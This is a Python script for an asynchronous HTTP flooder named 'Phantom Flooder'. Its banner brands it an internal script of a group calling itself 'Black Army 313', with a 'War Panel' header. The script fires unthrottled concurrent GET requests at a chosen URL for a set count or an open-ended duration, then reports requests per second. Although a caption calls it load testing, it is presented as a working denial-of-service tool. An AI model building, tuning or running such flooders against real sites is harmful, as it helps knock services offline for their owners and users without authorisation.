import argparse
import asyncio                     
import time
import sys                                                                                        
from typing import Optional
import aiohttp                   
from rich.console import Console 
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn
from rich.table import Table
from rich import print as rprint

class Result:
    def __init__(self, status_code: Optional[int] = None, duration: Optional[float] = None, error: Optional[Exception] = None):
        self.status_code = status_code 
        self.duration = duration
        self.error = error

async def make_request(session: aiohttp.ClientSession, url: str, verbose: bool, index: int) -> Result:
    start = time.perf_counter()
    try:
        async with session.get(url) as resp:
            status = resp.status
            # Discard body
            await resp.read()
            duration = time.perf_counter() - start
            if verbose:
                rprint(f"[green]Request {index+1}: HTTP Status Code {status} (Duration: {duration:.3f}s)[/green]")
            return Result(status_code=status, duration=duration)
    except Exception as e:
        duration = time.perf_counter() - start
        if verbose:
            rprint(f"[red]Request {index+1}: Error - {e} (Duration: {duration:.3f}s)[/red]")
        return Result(error=e, duration=duration)

async def run_requests(session: aiohttp.ClientSession, args, progress: Progress, task_id: int) -> tuple[int, int, float]:
    success = 0
    failed = 0
    total_time = 0.0
    index = 0
    start_time = time.perf_counter()

    while True:
        if args.duration and (time.perf_counter() - start_time) >= args.duration:
            break
        if not args.duration and index >= args.requests:
            break

        res = await make_request(session, args.url, args.verbose, index)
        index += 1
        progress.update(task_id, advance=1)

        if res.error:
            failed += 1
        else:
            if 200 <= res.status_code < 300:
                success += 1
                total_time += res.duration
            else:
                failed += 1

        # Rate limiting if needed, but for flooder, full speed
        await asyncio.sleep(0)  # Yield control

    return success, failed, total_time

async def main_async(args):
    console = Console()

    # Print professional header
    print("\033[32m▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒")
    print("\033[32m▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██╗██╗▒▒▒▒▒▒▒▒██╗▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒")
    print("\033[32m▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██║██║▒▒▒▒▒▒▒▒██║▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒")
    print("\033[32m▒▒▒██████╗▒█████╗▒██║██║▒██████╗██████╗▒▒███████╗▒▒")
    print("\033[32m▒▒██╔════╝██╔══██╗██║██║██╔══██╗██╔══██╗██╔═════╝▒▒")
    print("\033[32m▒▒██║▒▒▒▒▒██║▒▒██║██║██║██║▒▒██║██║▒▒██║▒██████╗▒▒▒")
    print("\033[32m▒▒██║▒▒▒▒▒██║▒▒██║██║██║██║▒▒██║██║▒▒██║▒▒▒▒▒▒██║▒▒")
    print("\033[32m▒▒▒██████╗▒█████╔╝██║██║▒██████║██╚███╔╝███████╔╝▒▒")
    print("\033[32m▒▒▒╚═════╝▒╚════╝▒╚═╝╚═╝▒╚═════╝╚═════╝▒▒╚═════╝▒▒▒")
    print("\033[32m▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒")
    print(f"\033[97m╔{'═' * 50}╗")
    print(f"\033[97m║\033[100m{' ' * 4}KunFayz{' ' * 38} \033[0m║")
    print(f"\033[97m║\033[100m{' ' * 4}Black Army 313 internal script{' ' *15} \033[0m║")
    print(f"\033[97m╚{'═' * 50}╝")
    header = Panel(
        "[bold blue]Phantom Flooder[/bold blue]\n"
        "Efficient load testing with asyncio and aiohttp\n"
        f"Target: {args.url}\n"
        f"Concurrency: {args.concurrency}\n"
        f"Timeout: {args.timeout}s\n"
        f"{'Duration: ' + str(args.duration) + 's' if args.duration else 'Requests: ' + str(args.requests)}",
        title="War Panel",
        border_style="green",
        expand=False
    )
    console.print(header)

    timeout = aiohttp.ClientTimeout(total=args.timeout)
    connector = aiohttp.TCPConnector(limit=args.concurrency)  # Limit concurrent connections
    async with aiohttp.ClientSession(timeout=timeout, connector=connector) as session:
        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
            console=console,
        ) as progress:
            if args.duration:
                total_tasks = args.concurrency  # For duration, we don't know total requests
                task_ids = [progress.add_task(f"Engine {i+1}", total=None) for i in range(args.concurrency)]
            else:
                total_requests = args.requests
                requests_per_worker = (total_requests + args.concurrency - 1) // args.concurrency
                task_ids = [progress.add_task(f"Engine {i+1}", total=
                                              requests_per_worker) for i in range(args.concurrency)]

            start_time = time.perf_counter()

            # Run workers
            workers = []
            for i in range(args.concurrency):
                workers.append(run_requests(session, args, progress, task_ids[i]))

            results = await asyncio.gather(*workers)

            total_success = sum(s for s, _, _ in results)
            total_failed = sum(f for _, f, _ in results)
            total_time_sum = sum(t for _, _, t in results)
            total_requests_done = total_success + total_failed

    total_duration = time.perf_counter() - start_time

    # Calculate stats
    avg_time = total_time_sum / total_success if total_success > 0 else 0
    success_rate = (total_success / total_requests_done) * 100 if total_requests_done > 0 else 0
    rps = total_requests_done / total_duration if total_duration > 0 else 0

    # Print summary table
    table = Table(title="Report", border_style="blue")
    table.add_column("Metric", style="cyan")
    table.add_column("Value", style="magenta")

    table.add_row("Target URL", args.url)
    table.add_row("Total Requests", str(total_requests_done))
    table.add_row("Concurrency Level", str(args.concurrency))
    table.add_row("Successful (2xx)", f"{total_success} ({success_rate:.2f}%)")
    table.add_row("Failed", str(total_failed))
    if total_success > 0:
        table.add_row("Avg Response Time", f"{avg_time:.3f} seconds")
    table.add_row("Requests Per Second (RPS)", f"{rps:.2f}")
    table.add_row("Total Time", f"{total_duration:.3f} seconds")

    console.print(table)

def main():
    parser = argparse.ArgumentParser(description="Phantom Flooder")
    parser.add_argument("--url", default="http://localhost:8080", help="Target URL to test")
    parser.add_argument("-n", "--requests", type=int, default=100, help="Total number of requests (ignored if --duration is set)")
    parser.add_argument("-c", "--concurrency", type=int, default=10, help="Number of concurrent connections")
    parser.add_argument("--timeout", type=float, default=30.0, help="Request timeout in seconds")
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose output")
    parser.add_argument("--duration", type=float, default=None, help="Run test for this duration in seconds (unlimited requests)")
    args = parser.parse_args()

    # Validation
    if args.requests <= 0 and not args.duration:
        rprint("[red]Error: requests must be positive integer if no duration is set[/red]")
        sys.exit(1)
    if args.concurrency <= 0:
        rprint("[red]Error: concurrency must be positive integer[/red]")
        sys.exit(1)
    if args.duration and args.duration <= 0:
        rprint("[red]Error: duration must be positive[/red]")
        sys.exit(1)

    asyncio.run(main_async(args))

if __name__ == "__main__":
    main()
    

    
